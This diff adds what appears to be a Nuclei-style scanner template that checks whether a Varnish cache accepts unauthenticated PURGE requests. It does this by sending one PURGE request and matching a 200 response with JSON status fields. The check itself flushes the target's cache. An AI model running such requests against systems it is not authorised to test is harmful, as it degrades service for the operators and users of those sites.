@@ -1,0 +1,36 @@
+id: varnish-unauth-cache-purge
+
+info:
+  name: Varnish Unauthenticated Cache Purge
+  author: s1d6p01nt7
+  severity: high
+  description: Checks if it is possible to purge Varnish cache without authentication.
+  reference:
+    - https://www.example.com/varnish-unauth-purge-vuln
+  tags: varnish,purge,cve
+
+requests:
+  - method: PURGE
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Accept: /
+      Accept-Language: en
+      User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"status": "ok"'
+        part: body
+
+      - type: regex
+        regex:
+          - '"id": "\w+-\w+-\w+"'
+        part: body
+
+      - type: status
+        status:
+          - 200
